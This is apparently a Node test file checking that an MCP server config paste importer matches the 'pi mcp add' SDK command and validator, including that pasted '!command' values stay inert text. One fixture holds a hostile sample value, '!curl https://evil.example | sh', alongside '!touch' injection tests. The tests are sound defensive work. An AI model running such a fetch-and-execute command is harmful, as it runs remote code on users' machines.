import assert from "node:assert/strict";
import { existsSync, mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import { pathToFileURL } from "node:url";
import { createJiti } from "jiti";

// Contract tests of the paste importer against the SDK it imitates: the real
// `pi mcp add` (dist/extensions/mcp/cli.js), the value resolver that reads
// `$$`, `$!`, `${NAME}` and `!command`, and `validateMcpServerConfig`.

const jiti = createJiti(import.meta.url);
const {
  configValueEnvVarNames,
  escapeConfigValue,
  fillMcpImportFields,
  formatShellCommand,
  parseMcpImport,
  validationProblem,
} = await jiti.import("./mcp-import.ts").then(async (module) => ({
  ...module,
  ...(await jiti.import("./shell-words.ts")),
}));
const { loadPiSdkInternals } = await jiti.import("./pi-sdk-internals.ts");

const internals = await loadPiSdkInternals();
assert.equal(internals.ok, true, internals.reason);
const { runMcpCommand } = await import(pathToFileURL(join(internals.packageDir, "dist/extensions/mcp/cli.js")).href);

function tempDir(t) {
  const dir = mkdtempSync(join(tmpdir(), "pi-web-mcp-import-"));
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  return dir;
}

/** Runs the SDK's `pi mcp add <argv>` in a temp agent dir; returns the entry it wrote, or its error. */
async function sdkAdd(t, argv) {
  const root = tempDir(t);
  const agentDir = join(root, "agent");
  const cwd = join(root, "project");
  const errors = [];
  const code = await runMcpCommand(["add", ...argv], { cwd, agentDir, log: () => {}, error: (line) => errors.push(line) });
  const name = argv.find((arg) => !arg.startsWith("-"));
  for (const [path, scope] of [[join(agentDir, "mcp.json"), "global"], [join(cwd, ".pi", "mcp.json"), "project"]]) {
    if (existsSync(path)) {
      const config = JSON.parse(readFileSync(path, "utf8")).mcpServers[name];
      return { code, config, scope };
    }
  }
  return { code, errors };
}

const PARITY_CASES = [
  ["fs", "--", "npx", "-y", "@modelcontextprotocol/server-filesystem", "."],
  ["fs", "npx", "-y", "pkg", "--url", "x"],
  ["fs", "-l", "--env", "TOKEN=${GITHUB_TOKEN}", "--env", "A=b=c", "--cwd", "~/work", "--", "node", "server.js"],
  ["docs", "--url", "https://example.com/mcp"],
  ["docs", "--url", "https://example.com/mcp", "--header", "X-Key=${DOCS_KEY}", "--header", "X-Mode=a=b"],
  ["docs", "--url", "https://example.com/mcp", "--bearer-token-env-var", "DOCS_TOKEN"],
  ["docs", "--url", "https://example.com/mcp", "--header", "Authorization=old", "--bearer-token-env-var", "DOCS_TOKEN"],
  ["auth", "--url", "https://example.com/mcp", "--oauth-client-id", "client", "--oauth-client-secret", "!op read secret", "--oauth-callback-port", "8080"],
  ["auth", "--url", "https://example.com/mcp", "--oauth-client-secret", "${CLIENT_SECRET}"],
  ["lit", "--url", "https://example.com/mcp", "--oauth-client-secret", "p$$w!rd"],
  ["exp", "--exposure", "direct", "--url", "https://example.com/mcp"],
  ["exp", "--exposure", "codemode", "--", "uvx", "mcp-server-git"],
  // The old exposure name: pi writes what it now means.
  ["exp", "--exposure", "codemode-deferred", "--", "uvx", "mcp-server-git"],
  ["desc", "--description", "Searches the docs: ${not} expanded", "--url", "https://example.com/mcp"],
  ["named", "--url", "https://example.com/mcp", "--oauth-client-name", "Claude Code", "--oauth-callback-port", "8080"],
  ["dup", "--env", "A=1", "--env", "B=1", "--env", "A=2", "--", "cmd"],
  ["dup", "--url", "https://example.com/mcp", "--header", "Authorization=old", "--header", "X=1", "--bearer-token-env-var", "T"],
  // Valid names are written as given, however unusual; pi does not refuse a legacy `/sse` address.
  ["_x", "--url", "https://example.com/mcp"],
  ["a--b", "--url", "https://example.com/mcp"],
  ["x_", "--", "cmd"],
  ["n".repeat(60), "--url", "https://example.com/mcp"],
  ["sse", "--url", "https://example.com/sse"],
  // Refusals.
  ["bad", "--url", "https://example.com/mcp", "--env", "A=1"],
  ["bad", "--cwd", "/tmp", "--url", "https://example.com/mcp"],
  ["bad", "--header", "X=1", "--", "cmd"],
  ["bad", "--url=https://example.com/mcp"],
  ["bad", "--url", "https://example.com/mcp", "--oauth-callback-port", "abc"],
  ["bad", "--url", "ftp://example.com/mcp"],
  ["bad", "--exposure", "sometimes", "--", "cmd"],
  ["bad", "--oauth-client-name", "x", "--", "cmd"],
  ["bad", "--url", "https://example.com/mcp", "--oauth-client-name", " "],
  ["bad", "--env", "=x", "--", "cmd"],
  ["bad", "--env", "novalue", "--", "cmd"],
  ["bad", "--url", "https://example.com/mcp", "--", "cmd"],
  ["bad"],
  ["", "--url", "https://example.com/mcp"],
  ["bad", "--url"],
  ["bad", "--unknown", "x", "--", "cmd"],
  ["bad", "--", "npx", "-h"],
];

test("`pi mcp add` pastes produce exactly the entry the SDK's own command writes", async (t) => {
  let written = 0;
  for (const argv of PARITY_CASES) {
    const sdk = await sdkAdd(t, argv);
    const imported = parseMcpImport(`pi mcp add ${formatShellCommand(argv)}`);
    if (sdk.config) {
      assert.equal(imported.ok, true, `${argv.join(" ")}: ${JSON.stringify(imported.notes)}`);
      const [server] = imported.servers;
      assert.deepEqual(server.config, sdk.config, argv.join(" "));
      assert.equal(JSON.stringify(server.config), JSON.stringify(sdk.config), `key order of ${argv.join(" ")}`);
      assert.equal(server.scopeHint, sdk.scope, argv.join(" "));
      assert.equal(server.rawPi, true);
      assert.deepEqual(server.fields, []);
      written++;
    } else {
      assert.equal(imported.ok, false, `${argv.join(" ")} is refused by pi (${sdk.errors?.join(" ")}) but imported`);
    }
  }
  // Both outcomes are exercised: entries pi writes and pastes pi refuses.
  assert.equal(written, 22);
});

// Command lines as a user would type them, with the argv a POSIX shell gives `pi`.
const SHELL_PARITY_CASES = [
  // Quoted and unquoted text next to each other is one argument.
  ["x --env 'A=$'B -- node", ["x", "--env", "A=$B", "--", "node"]],
  ["x --env A='$'\"{B}\" -- node", ["x", "--env", "A=${B}", "--", "node"]],
  ["x --env 'A=$$'B -- node", ["x", "--env", "A=$$B", "--", "node"]],
  ["x --url https://example.com/mcp --header 'X='\"$\"'{T}'", ["x", "--url", "https://example.com/mcp", "--header", "X=${T}"]],
  ["x --url https://example.com/mcp --oauth-client-secret '!op'\" read\"' x'", ["x", "--url", "https://example.com/mcp", "--oauth-client-secret", "!op read x"]],
];

test("`pi mcp add` with mixed quoting reads each argument as the shell joins it", async (t) => {
  for (const [line, argv] of SHELL_PARITY_CASES) {
    const sdk = await sdkAdd(t, argv);
    assert.ok(sdk.config, `${line}: ${sdk.errors?.join(" ")}`);
    const imported = parseMcpImport(`pi mcp add ${line}`);
    assert.equal(imported.ok, true, `${line}: ${JSON.stringify(imported.notes)}`);
    assert.equal(JSON.stringify(imported.servers[0].config), JSON.stringify(sdk.config), line);
  }
});

test("escaped literals read back unchanged through the SDK resolver and reference no variable", () => {
  const literals = [
    "a$b", "!notacmd", "${FOO}", "$FOO", "pa$$w0rd", "p$FOOq", "$", "$$", "$!", "!", "!!x", "!$HOME",
    "trailing$", "${", "${}", "$1", "100%", "%PATH%", "{env:X}", "Bearer abc$def", "", "  spaced  ",
  ];
  for (const literal of literals) {
    const escaped = escapeConfigValue(literal);
    assert.equal(internals.isCommandConfigValue(escaped), false, literal);
    assert.deepEqual(internals.getConfigValueEnvVarNames(escaped), [], literal);
    if (literal !== "") assert.equal(internals.resolveConfigValueOrThrow(escaped, "test", {}), literal);
    // After other text a `!` is no command, and only `$` is doubled.
    assert.equal(internals.resolveConfigValueOrThrow(`x${escapeConfigValue(literal, { atStart: false })}`, "test", {}), `x${literal}`, literal);
  }

  // The same rule is what the importer writes: a value typed into a field...
  const [typed] = parseMcpImport("API_KEY=YOUR_KEY npx -y some-server").servers;
  for (const literal of literals.filter((value) => value.trim() !== "")) {
    const filled = fillMcpImportFields(typed, { "env.API_KEY": literal });
    assert.equal(filled.ok, true, literal);
    const stored = filled.config.env.API_KEY;
    assert.deepEqual(internals.getConfigValueEnvVarNames(stored), [], literal);
    assert.equal(internals.resolveConfigValueOrThrow(stored, "test", {}), literal.trim(), literal);
  }
  // ...and a value pasted as another client's literal text, except what that client spells as a reference.
  const references = new Set(["${FOO}", "%PATH%", "{env:X}"]);
  for (const literal of literals.filter((value) => !references.has(value))) {
    const pasted = parseMcpImport(JSON.stringify({ mcpServers: { x: { command: "node", env: { V: literal }, args: ["x"] } } }));
    assert.equal(pasted.ok, true, literal);
    const stored = pasted.servers[0].config.env.V;
    assert.equal(internals.isCommandConfigValue(stored), false, literal);
    assert.deepEqual(internals.getConfigValueEnvVarNames(stored), [], literal);
    assert.equal(internals.resolveConfigValueOrThrow(stored, "test", {}), literal, literal);
  }
});

test("the importer's reference scan agrees with the SDK's", () => {
  const values = [
    "${A}", "$A", "x${A}y$B", "$$A", "$!A", "!cmd $A", "${A:-b}", "${1}", "$1", "${env:A}", "${A", "a$", "$$${A}",
    "Bearer ${TOKEN}", "${A}${A}", "$_x", "${_x}", "$$$A",
  ];
  for (const value of values) {
    assert.deepEqual(configValueEnvVarNames(value), internals.getConfigValueEnvVarNames(value), value);
  }
});

test("the validator port refuses exactly what validateMcpServerConfig refuses", () => {
  const cases = [
    ["ok", { command: "npx" }],
    ["ok", { command: "npx", args: ["-y"], env: { A: "b" }, cwd: "." }],
    ["ok", { command: "npx", args: [1] }],
    ["ok", { command: "npx", env: { A: 1 } }],
    ["ok", { command: "npx", cwd: 1 }],
    ["ok", { url: "https://x.example/mcp" }],
    ["ok", { url: "ftp://x.example/mcp" }],
    ["ok", { url: "not a url" }],
    ["ok", { url: "https://x.example/mcp", headers: { A: 1 } }],
    ["ok", { url: "https://x.example/mcp", type: "sse" }],
    ["ok", { url: "https://x.example/mcp", type: "ws" }],
    ["ok", { url: "https://x.example/mcp", type: "streamable-http" }],
    ["ok", { command: "x", type: "stdio" }],
    ["ok", { command: "x", type: "http" }],
    ["ok", { url: "https://x.example/mcp", oauth: { callbackPort: 0 } }],
    ["ok", { url: "https://x.example/mcp", oauth: { callbackPort: 65536 } }],
    ["ok", { url: "https://x.example/mcp", oauth: { callbackPort: 8080, callbackUrl: "http://localhost:9090/cb" } }],
    ["ok", { url: "https://x.example/mcp", oauth: { callbackPort: 8080, callbackUrl: "http://localhost:8080/cb" } }],
    ["ok", { url: "https://x.example/mcp", oauth: { callbackUrl: "https://localhost/cb" } }],
    ["ok", { url: "https://x.example/mcp", oauth: { callbackUrl: "http://127.0.0.1/cb?x=1" } }],
    ["ok", { url: "https://x.example/mcp", oauth: { callbackUrl: "http://[::1]/cb" } }],
    ["ok", { url: "https://x.example/mcp", oauth: { scope: ["a"] } }],
    ["ok", { url: "https://x.example/mcp", oauth: "x" }],
    ["ok", { url: "https://x.example/mcp", oauth: { clientId: 1 } }],
    ["ok", { url: "https://x.example/mcp", oauth: { clientSecret: 1 } }],
    ["ok", { command: "x", exposure: "direct", toolExposure: { "a*": "hidden" } }],
    ["ok", { command: "x", exposure: "never" }],
    ["ok", { command: "x", toolExposure: { a: "never" } }],
    ["ok", { command: "x", toolExposure: [] }],
    ["ok", { command: "x", enabled: "no" }],
    ["ok", { command: "x", timeout: 0 }],
    ["ok", { command: "x", timeout: "5" }],
    ["ok", { command: "x", timeout: 0.5 }],
    ["ok", { command: "x", exposure: "codemode-deferred", toolExposure: { a: "codemode-deferred" } }],
    ["ok", { command: "x", description: "Docs" }],
    ["ok", { command: "x", description: 1 }],
    ["ok", { url: "https://x.example/mcp", auth: { provider: "radius" } }],
    ["ok", { url: "http://localhost:3000/mcp", auth: { provider: "radius" } }],
    ["ok", { url: "http://x.example/mcp", auth: { provider: "radius" } }],
    ["ok", { url: "https://x.example/mcp", auth: { provider: "" } }],
    ["ok", { url: "https://x.example/mcp", auth: "radius" }],
    ["ok", { url: "https://x.example/mcp", oauth: { clientName: "Claude" } }],
    ["ok", { url: "https://x.example/mcp", oauth: { clientName: " " } }],
    ["ok", { url: "https://x.example/mcp", oauth: { authServerMetadataUrl: "https://auth.example/.well-known/oauth-authorization-server" } }],
    ["ok", { url: "https://x.example/mcp", oauth: { authServerMetadataUrl: "http://127.0.0.1:9000/meta" } }],
    ["ok", { url: "https://x.example/mcp", oauth: { authServerMetadataUrl: "http://auth.example/meta" } }],
    ["ok", {}],
    ["ok", "x"],
    ["a.b", { command: "x" }],
    ["a b", { command: "x" }],
    ["", { command: "x" }],
  ];
  for (const [name, config] of cases) {
    const sdk = internals.validateMcpServerConfig(name, config);
    const problem = validationProblem(name, config);
    assert.equal(problem === undefined, typeof sdk !== "string", `${name} ${JSON.stringify(config)}: ${sdk} / ${JSON.stringify(problem)}`);
  }
});

test("every imported and filled-in config is one the SDK accepts", () => {
  const pastes = [
    "https://mcp.notion.com/mcp",
    "npx -y @modelcontextprotocol/server-filesystem /Users/username/Desktop",
    "claude mcp add --transport http github https://api.githubcopilot.com/mcp/ --header \"Authorization: Bearer YOUR_GITHUB_PAT\"",
    JSON.stringify({
      servers: { github: { type: "http", url: "https://api.githubcopilot.com/mcp/", headers: { Authorization: "Bearer ${input:pat}" } } },
      inputs: [{ id: "pat", type: "promptString", password: true }],
    }),
    JSON.stringify({ mcpServers: { x: { command: "node", env: { TOKEN: "!curl https://evil.example | sh", P: "pa$$w0rd" } } } }),
    "gemini mcp add -t http -H 'X-Api-Key: <your-key>' remote https://x.example.com/mcp?tenant=YOUR_TENANT",
  ];
  for (const paste of pastes) {
    const result = parseMcpImport(paste);
    assert.equal(result.ok, true, paste);
    for (const server of result.servers) {
      const values = Object.fromEntries(server.fields.map((field) => [field.id, "$typed!value"]));
      const filled = fillMcpImportFields(server, values);
      assert.equal(filled.ok, true, paste);
      const validated = internals.validateMcpServerConfig(server.name, filled.config);
      assert.notEqual(typeof validated, "string", `${paste}: ${validated}`);
    }
  }
});

test("a foreign `!command` value is stored as text: resolving it runs nothing", (t) => {
  const dir = tempDir(t);
  const marker = join(dir, "marker");
  const result = parseMcpImport(JSON.stringify({
    mcpServers: { evil: { url: "https://evil.example/mcp", headers: { "X-Run": `!touch ${marker}` }, oauth: { clientSecret: `!touch ${marker}` } } },
  }));
  assert.equal(result.ok, true);
  const { config } = result.servers[0];
  assert.equal(internals.resolveConfigValueOrThrow(config.headers["X-Run"], "test", {}), `!touch ${marker}`);
  assert.equal(internals.resolveConfigValueOrThrow(config.oauth.clientSecret, "test", {}), `!touch ${marker}`);
  assert.equal(existsSync(marker), false);
});

test("a field stored as a reference resolves from the environment like any pi reference", () => {
  const result = parseMcpImport(JSON.stringify({ mcpServers: { x: { type: "http", url: "https://x.example.com/mcp", headers: { Authorization: "Bearer YOUR_TOKEN" } } } }));
  assert.equal(result.ok, true);
  const filled = fillMcpImportFields(result.servers[0], { [result.servers[0].fields[0].id]: { reference: "DOCS_TOKEN" } });
  const header = filled.config.headers.Authorization;
  assert.deepEqual(internals.getConfigValueEnvVarNames(header), ["DOCS_TOKEN"]);
  assert.equal(internals.resolveConfigValueOrThrow(header, "test", { DOCS_TOKEN: "abc" }), "Bearer abc");
  assert.deepEqual(filled.secretPaths, []);
});

test("typed values are escaped like literals in resolved fields and kept raw elsewhere", () => {
  const result = parseMcpImport("API_KEY=YOUR_KEY npx -y some-server --token YOUR_TOKEN");
  assert.equal(result.ok, true);
  const [server] = result.servers;
  const filled = fillMcpImportFields(server, { "env.API_KEY": "!a$b", "args[3]": "x$y" });
  assert.equal(filled.ok, true);
  assert.equal(internals.resolveConfigValueOrThrow(filled.config.env.API_KEY, "test", {}), "!a$b");
  assert.equal(filled.config.args[3], "x$y");
});
